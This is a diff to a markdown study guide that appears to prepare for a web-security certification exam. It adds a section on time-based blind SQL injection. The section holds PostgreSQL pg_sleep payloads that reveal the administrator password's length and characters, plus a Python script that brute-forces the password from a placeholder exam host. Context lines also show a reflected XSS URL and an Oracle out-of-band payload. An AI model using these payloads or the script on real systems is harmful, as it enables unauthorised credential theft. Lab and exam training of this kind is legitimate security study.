@@ -1847,7 +1847,8 @@ https://cms-TARGET.net/login?username=%3Cscript%3Ealert%28%27reflectXSS%27%29%3C
   
 [Blind Time Delay](#blind-time-delay)   
 [Blind SQLi](#blind-sqli)  
-[Blind SQLi no indication](#blind-sqli-no-indication)  
+[Blind SQLi no indication](#blind-sqli-no-indication)
+[SQLi timebase in exam](#SQLi-timebase-in-exam)
 [Blind SQLi Conditional Response](#blind-sqli-conditional-response)  
 [Oracle](#oracle)  
 [SQLMAP](#sqlmap)  
@@ -1950,7 +1951,48 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
 [OAST - Out-of-band Application Security Testing](https://portswigger.net/burp/application-security-testing/oast)  
 
 [PortSwigger Lab: Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)  
-  
+
+### SQLi Timebase in exam
+
+> Get length password administrator
+
+```SQL
+1'||(SELECT CASE WHEN (length((select password from users where username='administrator'))=20) THEN pg_sleep(2) ELSE pg_sleep(0) END)||'
+```
+
+> Get each character in the administrator's password
+
+```SQL
+1'||(SELECT CASE WHEN (SUBSTRING((select password from users where username='administrator'), xxx, 1)='yyy') THEN pg_sleep(2) ELSE pg_sleep(0) END)||'
+```
+- xxx is the position of that character in the password string
+- yyy is the value of the character in the password at position xxx
+
+> Script python
+
+```Python
+import requests
+import string
+
+URL = "https://exam_host/advanced-search?sort_by=DATE&blogArtist=&searchterm="
+
+cookie = {"session": "cookie_user"}
+
+chars = string.ascii_letters + string.digits
+password = ''
+for i in range(1,21):
+    for j in chars:
+        payload = f"1'||(SELECT CASE WHEN (SUBSTRING((select password from users where username='administrator'), {i}, 1)='{j}') THEN pg_sleep(2) ELSE pg_sleep(0) END)||'"
+        print(f"Try: {j} at address {i}", end="\r")
+        try:
+            response = requests.get(URL+payload, cookies=cookie, timeout=2)
+        except requests.exceptions.Timeout:
+            password += j
+            break
+
+print("Password: " + password)
+```
+
 ### Blind SQLi Conditional Response
 
 >This blind SQL injection is ***identified*** by a small message difference in the responses. When sending a valid true SQL query the response contain ```Welcome back``` string in response. Invalid false SQL query statement do not contain the response conditional message.  
